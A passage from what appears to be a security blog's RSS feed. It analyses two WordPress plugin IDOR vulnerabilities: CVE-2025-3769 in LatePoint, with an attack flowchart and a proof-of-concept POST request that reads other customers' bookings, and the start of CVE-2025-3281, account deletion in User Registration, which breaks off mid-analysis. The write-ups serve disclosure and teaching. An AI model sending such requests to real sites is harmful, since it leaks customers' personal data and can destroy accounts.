&lt;code&gt;$action&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If empty → return &lt;code&gt;[]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Convert &lt;code&gt;$controller_name&lt;/code&gt; to PascalCase, remove &lt;code&gt;_&lt;/code&gt;, and add prefix &lt;code&gt;Os&lt;/code&gt; and suffix &lt;code&gt;Controller&lt;/code&gt; → class name.&lt;/li&gt;&#xA;&lt;li&gt;Check if the class exists → create object.&lt;/li&gt;&#xA;&lt;li&gt;Check if the method exists in the object → return array &lt;code&gt;[&#39;controller&#39; =&amp;gt; object, &#39;action&#39; =&amp;gt; method]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If the class or method does not exist → return empty array &lt;code&gt;[]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;The function &lt;code&gt;call_by_route_name()&lt;/code&gt; then checks &lt;code&gt;$route_data&lt;/code&gt;. If not empty, it sets the return format and checks access permission via &lt;code&gt;can_current_user_access_action($action)&lt;/code&gt;. If the current user is allowed to access this action, it calls the method: &lt;code&gt;$controller_obj-&amp;gt;$action()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;By default, when a user has a &lt;code&gt;LatePoint&lt;/code&gt; cookie (becomes a customer), this condition is satisfied.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/cookie.png&#34; title=&#34;LatePoint user cookie&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/cookie.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;LatePoint user cookie&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/cookie.png&#39; alt=&#34;Cookie&#34; height=&#34;388&#34; width=&#34;773&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;LatePoint user cookie&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;To obtain this cookie, the user needs to place an order and use the create account functionality:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/order.png&#34; title=&#34;Create account&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/order.png&#34; data-sub-html=&#34;&lt;h2&gt;Account&lt;/h2&gt;&lt;p&gt;Create account&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/order.png&#39; alt=&#34;Account&#34; height=&#34;899&#34; width=&#34;694&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create account&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;When diffing the code, I found that some logic in the &lt;code&gt;OsCustomerCabinetController&lt;/code&gt; class functions was fixed by checking ownership before returning data:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $order-&amp;gt;is_new_record() || ( $order-&amp;gt;customer_id != OsAuthHelper::get_logged_in_customer_id() ) ) {&#xA;    $this-&amp;gt;send_json( array(&#xA;        &amp;#39;status&amp;#39; =&amp;gt; LATEPOINT_STATUS_ERROR,&#xA;        &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Not Allowed&amp;#39;, &amp;#39;latepoint&amp;#39;)&#xA;    ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/diff.png&#34; title=&#34;Some functions were fixed&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Fix&lt;/h2&gt;&lt;p&gt;Some functions were fixed&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/diff.png&#39; alt=&#34;Fix&#34; height=&#34;915&#34; width=&#34;1860&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Some functions were fixed&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This matches my analysis above, for example:&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Valid route&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;route_name=customer_cabinet__view_booking_summary_in_lightbox&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;will be mapped to:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;OsCustomerCabinetController::view_booking_summary_in_lightbox()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;view_booking_summary_in_lightbox()&lt;/code&gt; is called to return booking data.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Create Booking (no login required)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Creates Customer account&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Customer cookie issued (logged-in as customer)&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Attacker sends request to admin-ajax.php?action=latepoint_route_call&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;route_name=customer_cabinet__view_booking_summary_in_lightbox&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Router resolves to OsCustomerCabinetController&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;can_current_user_access_action() → PASS&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;view_booking_summary_in_lightbox() called&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;Booking ID taken from request&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;No ownership validation (&amp;lt;= 5.1.92)&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Sensitive booking data leaked (email, name, etc.)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Send request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php?t=1766721895425 HTTP/1.1&#xA;Host: localhost&#xA;Cookie: __stripe_mid=f13365af-449c-4412-b77c-7213da0dbe814d9925; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; latepoint_cart_86a9106ae65537651a8e456835b316ab=8ffe0e2c-9c69-48f8-94d9-18dd24022f90; latepoint_customer_logged_in_cookie&#xA;&#xA;action=latepoint_route_call&amp;amp;route_name=customer_cabinet__view_booking_summary_in_lightbox&amp;amp;params=booking_id=other_booking_id&amp;amp;return_format=json&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Resutl&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/result.png&#39; alt=&#34;Resutl&#34; height=&#34;653&#34; width=&#34;1874&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The CVE‑2025‑3769 vulnerability originates from missing ownership validation in the actions of &lt;code&gt;OsCustomerCabinetController&lt;/code&gt;. A user with a valid session can access other users’ bookings. Version 5.1.93 fixes this by validating &lt;code&gt;customer_id&lt;/code&gt; before returning data, preventing IDOR.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Authentication does not equal authorization.&lt;/li&gt;&#xA;&lt;li&gt;Never trust client-supplied data (IDs, routes, params).&lt;/li&gt;&#xA;&lt;li&gt;Always check ownership at the business logic layer.&lt;/li&gt;&#xA;&lt;li&gt;Dynamic routing requires strict access control.&lt;/li&gt;&#xA;&lt;li&gt;IDOR occurs when user–object relationships are not properly validated.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/latepoint/vulnerability/wordpress-latepoint-plugin-5-1-92-unauthenticated-insecure-direct-object-reference-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LatePoint Plugin &amp;lt;= 5.1.92 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3281 Analysis &amp; PoC</title>
      <link>http://localhost:1313/posts/2025-12-25-cve-2025-3281/</link>
      <pubDate>Thu, 25 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-25-cve-2025-3281/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;User Registration &amp;amp; Membership – Custom Registration Form, Login Form, and User Profile&lt;/strong&gt; plugin for WordPress contains an &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; vulnerability in all versions up to &lt;strong&gt;4.2.1&lt;/strong&gt;, within the &lt;code&gt;create_stripe_subscription()&lt;/code&gt; function, due to &lt;strong&gt;missing validation of the user-controlled &lt;code&gt;member_id&lt;/code&gt; parameter&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;This allows an &lt;strong&gt;unauthenticated attacker&lt;/strong&gt; to &lt;strong&gt;delete arbitrary user accounts&lt;/strong&gt; created via this plugin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3281&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3281&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.2.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.2.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/user-registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version – User Registration&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.2.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.2.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;According to the CVE description, the vulnerability resides in the &lt;code&gt;create_stripe_subscription()&lt;/code&gt; function of the plugin. This function handles the creation of Stripe subscriptions for users after registration.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function create_stripe_subscription() {&#xA;    ur_membership_verify_nonce( &amp;#39;ur_membership_confirm_payment&amp;#39; );&#xA;    $customer_id       = isset( $_POST[&amp;#39;customer_id&amp;#39;] ) ? $_POST[&amp;#39;customer_id&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $payment_method_id = isset( $_POST[&amp;#39;payment_method_id&amp;#39;] ) ? sanitize_text_field( $_POST[&amp;#39;payment_method_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $member_id         = absint( wp_unslash( $_POST[&amp;#39;member_id&amp;#39;] ) ); &#xA;&#xA;    $is_user_created = get_user_meta( $member_id, &amp;#39;urm_user_just_created&amp;#39; );&#xA;    if ( ! $is_user_created ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Invalid Request.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    $stripe_service      = new StripeService();&#xA;    $form_response       = isset( $_POST[&amp;#39;form_response&amp;#39;] ) ? (array) json_decode( wp_unslash( $_POST[&amp;#39;form_response&amp;#39;] ), true ) : array();&#xA;    $stripe_subscription = $stripe_service-&amp;gt;create_subscription( $customer_id, $payment_method_id, $member_id );&#xA;&#xA;    if ( $stripe_subscription[&amp;#39;status&amp;#39;] ) {&#xA;        wp_send_json_success( $stripe_subscription );&#xA;    } else {&#xA;        wp_delete_user( absint( $member_id ) );&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#34;Something went wrong when updating users payment status&amp;#34; )&#xA;            )&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function performs a nonce check using &lt;code&gt;ur_membership_verify_nonce( &#39;ur_membership_confirm_payment&#39; );&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Searching for the keyword &lt;code&gt;ur_membership_confirm_payment&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/nonce.png&#34; title=&#34;Nonce&#34; data-thumbnail=&#34;/posts/2025-12-25-cve-2025-3281/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-25-cve-2025-3281/nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;639&#34; width=&#34;1645&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The nonce is created with the key &lt;code&gt;_confirm_payment_nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;This key and value are included in the &lt;code&gt;/membership-registration/?&lt;/code&gt; endpoint.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/value.png&#34; title=&#34;Nonce in response&#34; data-thumbnail=&#34;/posts/2025-12-25-cve-2025-3281/value.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;Nonce in response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-25-cve-2025-3281/value.png&#39; alt=&#34;Value&#34; height=&#34;442&#34; width=&#34;1541&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce in response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;At the beginning of the function, data is taken directly from &lt;code&gt;$_POST&lt;/code&gt;, including &lt;code&gt;customer_id&lt;/code&gt;, &lt;code&gt;payment_method_id&lt;/code&gt;, and especially &lt;code&gt;member_id&lt;/code&gt;, which is taken directly from the request without any ownership or permission validation.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$member_id = absint( wp_unslash( $_POST[&amp;#39;member_id&amp;#39;] ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next, the function checks whether the user associated with &lt;code&gt;member_id&lt;/code&gt; has the 